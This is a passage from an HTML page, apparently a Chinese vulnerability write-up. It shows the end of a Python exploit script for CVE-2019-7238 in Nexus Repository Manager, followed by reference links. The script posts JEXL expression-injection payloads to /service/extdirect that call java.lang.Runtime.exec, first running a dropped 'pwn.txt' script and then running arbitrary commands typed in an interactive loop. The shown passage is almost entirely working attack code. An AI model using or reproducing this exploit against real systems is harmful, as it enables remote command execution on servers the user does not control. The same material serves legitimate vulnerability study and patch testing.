&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkSuccess(r)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Executing command =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;bash pwn.txt\&quot;)&quot;}, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkSuccess(r)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command = input(&quot;command (not reflected)&gt; &quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Executing command =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;&quot; + command + &quot;\&quot;)&quot;}, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkSuccess(r)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except KeyboardInterrupt:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Exiting...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/4136</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://www.jianshu.com/p/34e450debe0f</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/mpgn/CVE-2019-7238</span></p></body>
</html>
